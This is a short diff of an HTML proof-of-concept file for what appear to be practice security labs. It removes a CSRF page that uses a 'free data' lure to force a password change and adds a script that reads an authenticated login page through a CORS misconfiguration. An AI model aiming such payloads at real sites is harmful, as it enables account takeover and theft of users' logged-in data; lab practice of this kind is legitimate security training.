@@ -1,11 +1,8 @@
-<html>
-<body>
-<h1>Congratulations! You've won 1GB free data! 🔥📲</h1>
-<form action="https://labs.hacktify.in/HTML/csrf_lab/lab_7/lab_7.php" method="POST">
-<input type="hidden" name="new_password" value="cyber">
-<input type="hidden" name="confirm_password" value="cyber">
-<input type="hidden" name="token" value="9f30abfb7a0141bb657fa6d587a5878b">
-<input type="submit" value="Click Here to Claim">
-</form>
-</body>
-</html>
+<script>
+fetch("https://labs.hacktify.in/HTML/cors_lab/lab_4/login.php", {
+  method: "GET",
+  credentials: "include"
+})
+.then(response => response.text())
+.then(data => alert(data));
+</script>
